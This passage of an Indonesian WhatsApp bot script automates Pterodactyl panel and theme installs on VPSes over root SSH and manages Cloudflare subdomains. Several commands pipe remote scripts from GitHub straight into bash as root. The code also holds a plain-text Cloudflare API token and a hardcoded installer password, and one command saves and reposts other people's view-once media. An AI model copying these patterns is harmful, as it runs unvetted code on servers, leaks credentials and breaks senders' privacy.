        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('AutoCnode Faxz\n');
        stream.write(`${domainnode}\n`);
        stream.write('AlwaysFaxzForNindya\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break  
case 'uninstallpanel': {
    if (!isFaxzCreator) return replyalwaysfaxz(`\`\`\`Lu Siapa??? Sok Asik Bego Fitur Ini Khusus AlwaysFaxz For Nindya\`\`\``);
    let t = text.split(',');
    if (t.length < 2) return replyalwaysfaxz(`*Format salah!*\nPenggunaan: ${prefix}uninstallpanel ipvps,password`);
    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = 'bash <(curl -s https://pterodactyl-installer.se)';

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi
    conn.on('ready', () => {
        replyalwaysfaxz('*PROSES UNINSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 20 DETIK*');
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
            }).on('data', (data) => {
                console.log('STDOUT: ' + data);
                if (data.toString().includes('Input')) {
                    if (data.toString().includes('6')) {
                        stream.write('6\n');
                    } if (data.toString().includes('y\n')) {
                        stream.write('y\n');
                    } if (data.toString().includes('y\n')) {
                        stream.write('y\n');
                    } if (data.toString().includes('y\n')) {
                        stream.write('y\n');
                    } if (data.toString().includes('y\n')) {
                        stream.write('y\n');
                    } 
                }
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);
    await new Promise(resolve => setTimeout(resolve, 20000));
    if (isSuccess) {
            replyalwaysfaxz('`SUKSES UNINSTALL PANEL ANDA, SILAHKAN CEK`');
        }
   }
    break;
case 'startwings': case 'configurewings': {
    if (!isFaxzCreator) return replyalwaysfaxz(`\`\`\`Lu Siapa??? Sok Asik Bego Fitur Ini Khusus AlwaysFaxz For Nindya\`\`\``);
    
    let t = text.split(',');
    if (t.length < 2) return replyalwaysfaxz(`*Format salah!*\nPenggunaan: ${cmd} ipvps,password,token (token configuration)`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Alwaysfaxz/qwertyuiopasdfghjklzxcvbnm/main/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyalwaysfaxz('*PROSES CONFIGURE WINGS*')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
replyalwaysfaxz('SUCCES START WINGS DI PANEL ANDA COBA CEK PASTI IJO😁');
                conn.end();
            }).on('data', (data) => {
            stream.write('faxzsygnindya\n');
                stream.write('3\n');
                stream.write(`${token}\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyalwaysfaxz('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }

break
case 'thema1': {
    if (!isFaxzCreator) return replyalwaysfaxz(`\`\`\`Lu Siapa??? Sok Asik Bego Fitur Ini Khusus AlwaysFaxz For Nindya\`\`\``);
    
    let t = text.split(',');
    if (t.length < 2) return replyalwaysfaxz(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function rafatharcode(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Alwaysfaxz/qwertyuiopasdfghjklzxcvbnm/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyalwaysfaxz('*PROSES INSTALL THEME DIMULAI*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                replyalwaysfaxz('`SUKSES INSTALL THEME`')
                conn.end();
            }).on('data', (data) => {
                stream.write('faxzsygnindya\n');
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyalwaysfaxz('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            replyalwaysfaxz('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'thema2': {
    if (!isFaxzCreator) return replyalwaysfaxz(`\`\`\`Lu Siapa??? Sok Asik Bego Fitur Ini Khusus AlwaysFaxz For Nindya\`\`\``);
    
    let t = text.split(',');
    if (t.length < 2) return replyalwaysfaxz(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function rafatharcode(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Alwaysfaxz/qwertyuiopasdfghjklzxcvbnm/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyalwaysfaxz('*PROSES INSTALL THEME DIMULAI*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                replyalwaysfaxz('`SUKSES INSTALL THEME`')
                conn.end();
            }).on('data', (data) => {
                stream.write('faxzsygnindya\n');
                stream.write('1\n');
                stream.write('2\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyalwaysfaxz('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            replyalwaysfaxz('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'thema3': {
    if (!isFaxzCreator) return replyalwaysfaxz(`\`\`\`Lu Siapa??? Sok Asik Bego Fitur Ini Khusus AlwaysFaxz For Nindya\`\`\``);
    
    let t = text.split(',');
    if (t.length < 2) return replyalwaysfaxz(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function rafatharcode(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Alwaysfaxz/qwertyuiopasdfghjklzxcvbnm/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyalwaysfaxz('*PROSES INSTALL THEME DIMULAI*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                replyalwaysfaxz('`SUKSES INSTALL THEME`')
                conn.end();
            }).on('data', (data) => {
                stream.write('faxzsygnindya\n');
                stream.write('1\n');
                stream.write('3\n');
                stream.write('\n');
                stream.write('https://chat.whatsapp.com/DwDKuFFF9u2FfvwCh8FIbJ\n');
                stream.write('https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyalwaysfaxz('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            replyalwaysfaxz('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
    
}
break  
    case 'uninstallthema': {
    if (!isFaxzCreator) return replyalwaysfaxz(`\`\`\`Lu Siapa??? Sok Asik Bego Fitur Ini Khusus AlwaysFaxz For Nindya\`\`\``);
    
    let t = text.split(',');
    if (t.length < 2) return replyalwaysfaxz(`*Format salah!*\nPenggunaan: ${prefix}uninstalltheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function rafatharcode(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/Alwaysfaxz/qwertyuiopasdfghjklzxcvbnm/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyalwaysfaxz('*PROSES UNINSTALL THEME DIMULAI*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                replyalwaysfaxz('`SUKSES UNINSTALL THEME`')
                conn.end();
            }).on('data', (data) => {
                stream.write('faxzsygnindya\n');
                stream.write('2\n');
                stream.write('y\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyalwaysfaxz('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            replyalwaysfaxz('Done? Ga Bg??? Donee');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replyalwaysfaxz(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replyalwaysfaxz(mess.group)
                if (isAfkOn) return replyalwaysfaxz("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replyalwaysfaxz(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case 'listusr': {
  if (!isFaxzCreator) return replyalwaysfaxz(`*\`[ # ]\`* _Khusus Faxz_`)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await AlwaysFaxzMd.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    replyalwaysfaxz(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case 'delusr': {
  if (!isFaxzCreator) return replyalwaysfaxz(`Khusus ${global.botname} Aja`)
let usr = args[0]
if (!usr) return replyalwaysfaxz('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return replyalwaysfaxz('*USER NOT FOUND*')
replyalwaysfaxz('*SUCCESSFULLY DELETE THE USER*')
}
        break
        case 'sikat': {
if (!isFaxzCreator) return replyalwaysfaxz(`*\`[ # ]\`* _Khusus Faxz_`)
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕓', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕙', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕛', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🔎', key: m.key }})
	if (!m.quoted) return replyalwaysfaxzFaxz(`balas foto/video 1x lihat`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replyalwaysfaxzFaxz(`yang anda balas bukan foto/video 1x lihat`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return AlwaysFaxzMd.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return AlwaysFaxzMd.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
    await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '📥', key: m.key }})
    await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break
case 'listdomain': {
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕓', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕙', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🕛', key: m.key }})
  await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '🔎', key: m.key }})
var tekxx = `Hay _${pushname}_ 
> *Berikut List Domain/Subdomain*
> *Yg Tersedia*

★━━『 *\`LIST DOMAIN\`* 』━━★
> ★ d1 cloudxingyu.me
> ★ d2 mypanell.biz.id
> ★ d3 piwzstoreee.my.id
> ★ d4 piwzpediaaa.biz.id
> ★ d5 piwzpanel.me
> ★ d6 r0ulxye4.my.id
> ★ d7 lanzpanel.my.id
> ★ d8 cpanel-vip.my.id (khusus cpanel)
> ★ d9 tokopanellku.my.id
> ★ d10 kiospanell.my.id
> ★ d11 moon-offc.my.id
> ★ d12 moon-ooffc.biz.id
> ★ d13 panellstore.site
> ★ d14 tokopanellmurah.my.id
> ★ d15 bisnispanel.my.id
> ★ d16 xmartpanel.my.id
> ★ d17 tokopanel.biz.id
> ★ d18 store-panel.biz.id
> ★ d19 sellerpanel.biz.id
> ★ d20 panellprivate.my.id
> ★ d21 mypanel.my.id
> ★ d22 kangpanel.biz.id
> ★ d23 jasapanel.my.id
> ★ d24 dewapanel.my.id
> ★ d25 adminpanel.biz.id
> ★ d26 plerkuda.my.id
> ★ d27 cafegt.my.id
> ★ d28 shopwebsite.my.id
> ★ d29 market-software.my.id
> ★ d30 sellerpanel-vvip.my.id
> ★ d31 ekioffcial.biz.id
> ★ d32 panelku-jasteb.my.id
> ★ d33 pannel-pvrt.my.id
> ★ d34 pannelkuu.biz.id
> ★ d35 server-smtp1.my.id
> ★ d36 my-website.my.id
> ★ d37 smtp1.my.id
> ★ d38 panelstore.xyz
> ★ d39 hamstore.me
> ★ d40 h-pay.my.id
> ★ d41 panelprivate.my.id
> ★ d42 pannelku.biz.id
> ★ d43 nshhosting.my.id
> ★ d44 panellstoree.com
> ★ d45 kayyoffc.tech
> ★ d46 kayypedia.com
> ★ d47 panell.icu
> ★ d48 highscale.my.id
> ★ d49 heavencraft.my.id
> ★ d50 servemcpec.my.id
> ★ d51 ghostxdzz.online
┗━═┅═━━━๑
> *Cara Membuat Subdomain*
> *Silahkan Ketik .createdomain*
            
_©ÂlwâysFâxz_`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: tekxx
          }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\"}`
									},
            {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"KEMBALI\",\"id\":\".menu\"}`
									},],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363294318768415@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})
  
await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break
case 'createdomain': case 'cdomain': case 'cratedomain': {
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} hostname,ipvps`);
let hostname = t[0];
let ipvpsnya = t[1];
const domainfaxz = `
*Hay Silahkan Memilih Domain / Subdomain*
*Yg Tersedia Di Dalam Pilihan Dibawah*

_©AlwaysFaxz_`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: domainfaxz
          }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "々 SILAHKAN PILIH 々",
  "sections": [
    {
      "title": "©AlwaysFaxz",
      "rows": [
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "cloudxingyu.me",
          "id": ".d1 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "mypanell.biz.id",
          "id": ".d2 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "piwzstoreee.my.id",
          "id": ".d3 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "piwzstoreee.biz.id",
          "id": ".d4 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "piwzpanel.me",
          "id": ".d5 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "r0ulxye4.my.id",
          "id": ".d6 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "lanzpanel.my.id",
          "id": ".d7 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "cpanel-vip.my.id (khusus cpanel)",
          "id": ".d8 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "tokopanellku.my.id",
          "id": ".d9 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "kiospanell.my.id",
          "id": ".d10 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "moon-offc.my.id",
          "id": ".d11 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "moon-ooffc.biz.id",
          "id": ".d12 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "panellstore.site",
          "id": ".d13 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "tokopanellmurah.my.id",
          "id": ".d14 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "bisnispanel.my.id",
          "id": ".d15 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "xmartpanel.my.id",
          "id": ".d16 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "tokopanel.biz.id",
          "id": ".d17 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "store-panel.biz.id",
          "id": ".d18 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "sellerpanel.biz.id",
          "id": ".d19 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "panellprivate.my.id",
          "id": ".d20 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "mypanel.my.id",
          "id": ".d21 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "kangpanel.biz.id",
          "id": ".d22 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "jasapanel.my.id",
          "id": ".d23 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "dewapanel.my.id",
          "id": ".d24 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "adminpanel.biz.id",
          "id": ".d25 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "plerkuda.my.id",
          "id": ".d26 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "cafegt.my.id",
          "id": ".d27 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "shopwebsite.my.id",
          "id": ".d28 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "market-software.my.id",
          "id": ".d29 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "sellerpanel-vvip.my.id",
          "id": ".d30 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "ekioffcial.biz.id",
          "id": ".d31 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "panelku-jasteb.my.id",
          "id": ".d32 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "pannel-pvrt.my.id",
          "id": ".d33 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "pannelkuu.biz.id",
          "id": ".d34 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "server-smtp1.my.id",
          "id": ".d35 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "my-website.my.id",
          "id": ".d36 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "smtp1.my.id",
          "id": ".d37 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "panelstore.xyz",
          "id": ".d38 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "hamstore.me",
          "id": ".d39 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "h-pay.my.id",
          "id": ".d40 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "panelprivate.my.id",
          "id": ".d41 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "pannelku.biz.id",
          "id": ".d42 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "nshhosting.my.id",
          "id": ".d43 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "panellstoree.com",
          "id": ".d44 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "kayyoffc.tech",
          "id": ".d45 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "kayypedia.com",
          "id": ".d46 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "panell.icu",
          "id": ".d47 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "highscale.my.id",
          "id": ".d48 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "heavencraft.my.id",
          "id": ".d9 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "servemcpec.my.id",
          "id": ".d50 ${hostname}|${ipvpsnya}"
        },
        {
          "header": "DOMAIN/SUBDOMAIN",
          "title": "click to create",
          "description": "ghostxdzz.online",
          "id": ".d51 ${hostname}|${ipvpsnya}"
        }
      ]
    }
  ]
}`

              },
            {
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\"}`
									},
            {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"KEMBALI\",\"id\":\".menu\"}`
									},],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363294318768415@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})
  
await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'd1': {
 
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "f267a35df1d1b1de6ad8d64a0b7b4fde";
    let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
    let tld = "cloudxingyu.me";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
